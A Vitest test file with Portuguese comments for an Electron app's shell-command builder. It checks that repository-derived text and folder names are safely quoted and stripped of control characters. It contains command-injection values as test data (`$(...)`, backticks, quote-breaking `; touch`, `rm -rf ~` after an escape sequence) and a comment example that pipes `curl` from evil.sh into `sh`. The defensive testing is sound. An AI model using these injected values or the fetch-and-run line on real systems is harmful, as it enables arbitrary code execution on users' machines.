import { execFile } from 'node:child_process'
import { existsSync, mkdirSync, mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { promisify } from 'node:util'
import { describe, expect, it } from 'vitest'

// @ts-expect-error módulo do processo main, sem tipos
import { aspasPosix, limparControle, montarComandoShell } from '../electron/terminal.js'

const exec = promisify(execFile)
const AMBIENTE = { env: { ...process.env, TERM: 'xterm' } }

/**
 * O bug: o nome de uma parte do projeto executava comando no computador.
 *
 * O texto do pedido é montado a partir do repositório observado — nome de
 * parte vindo do `.wtf/map.json`, nome de arquivo vindo do Git, motivo escrito
 * pelo modelo. Nada disso é nosso. Ele ia para `do script` no macOS e para
 * `bash -lc` no Linux dentro de aspas DUPLAS, e `$(...)` dentro de aspas
 * duplas é executado pelo shell.
 *
 * Um repositório clonado do GitHub com uma parte chamada
 * `pagamentos $(curl -s https://evil.sh|sh)` rodava esse curl com as permissões
 * inteiras de quem clicou no botão "abrir no sistema".
 *
 * O conserto é aspas simples com escape POSIX, mais a remoção dos caracteres de
 * controle: dentro de aspas simples o shell não interpreta nada.
 */
describe('montar o comando que abre a IA no terminal do sistema', () => {
  const AGENTE = '/bin/echo'

  const comProva = async (texto: (prova: string) => string) => {
    const dir = mkdtempSync(path.join(tmpdir(), 'wtf-inj-'))
    const prova = path.join(dir, 'EXECUTOU')
    try {
      await exec('/bin/sh', ['-c', montarComandoShell(dir, AGENTE, texto(prova))], AMBIENTE)
      // A prova não é a string montada: é o disco. Se o arquivo existe, o shell
      // executou o que veio do repositório observado.
      return existsSync(prova)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  }

  it('trata $(...) como texto, e não como comando', async () => {
    expect(await comProva((p) => `pagamentos $(touch ${p})`)).toBe(false)
  })

  it('trata crase como texto, e não como comando', async () => {
    expect(await comProva((p) => 'login `touch ' + p + '`')).toBe(false)
  })

  it('uma aspa simples no meio do texto não abre caminho para comando novo', async () => {
    expect(await comProva((p) => `nome'; touch ${p}; echo '`)).toBe(false)
  })

  it('o pedido chega inteiro ao agente, sem o shell ter comido nada', async () => {
    const dir = mkdtempSync(path.join(tmpdir(), 'wtf-inj-'))
    try {
      const texto = 'Parte: pagamentos $HOME `id` $(id)'
      const { stdout } = await exec(
        '/bin/sh',
        ['-c', montarComandoShell(dir, AGENTE, texto)],
        AMBIENTE,
      )
      // Neutralizar não pode virar mutilar: o agente precisa receber o texto
      // que a pessoa leu na tela antes de mandar. O `clear` da linha escreve
      // as sequências de limpar tela no mesmo stdout, e elas saem daqui.
      const semTela = stdout.replace(/\u001b\[[0-9;?]*[A-Za-z]/g, '')
      expect(semTela.trim()).toBe(texto)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  /*
   * A pasta é menos exposta que o pedido (vem de `projetoAtual`, já conferida
   * como repositório Git), mas `'` e `;` são caracteres de nome de arquivo
   * perfeitamente válidos nos três sistemas. Então a pasta é criada de
   * verdade, com o ataque no nome, e o `sh` roda de verdade.
   */
  it('a pasta do projeto também é citada, não concatenada', async () => {
    const base = mkdtempSync(path.join(tmpdir(), 'wtf-inj-'))
    const dir = path.join(base, "pasta'; touch EXECUTOU; echo '")
    mkdirSync(dir)
    try {
      await exec('/bin/sh', ['-c', montarComandoShell(dir, AGENTE, null)], {
        ...AMBIENTE,
        cwd: base,
      })
      expect(existsSync(path.join(base, 'EXECUTOU'))).toBe(false)
    } finally {
      rmSync(base, { recursive: true, force: true })
    }
  })

  /*
   * Quebra de linha dentro de um comando de shell é Enter: vira comando novo.
   * ESC abre sequência de terminal. Nada disso pode sobreviver ao caminho que
   * termina numa janela de terminal de verdade.
   */
  it('remove quebra de linha, ESC e NUL antes de montar qualquer coisa', () => {
    expect(limparControle('a\nb\r\nc')).toBe('a b c')
    expect(limparControle('login\x1b[201~\rrm -rf ~')).not.toContain('\x1b')
    expect(limparControle('x\0y')).toBe('xy')
    expect(montarComandoShell('/tmp', AGENTE, 'oi\ntouch /tmp/EXECUTOU')).not.toContain('\n')
  })

  it('aspasPosix devolve algo que o shell entrega intacto', async () => {
    const dificil = "aspa ' cifrão $ crase ` barra \\ e-comercial && cano |"
    const { stdout } = await exec('/bin/sh', ['-c', `/bin/echo ${aspasPosix(dificil)}`])
    expect(stdout.trim()).toBe(dificil)
  })
})
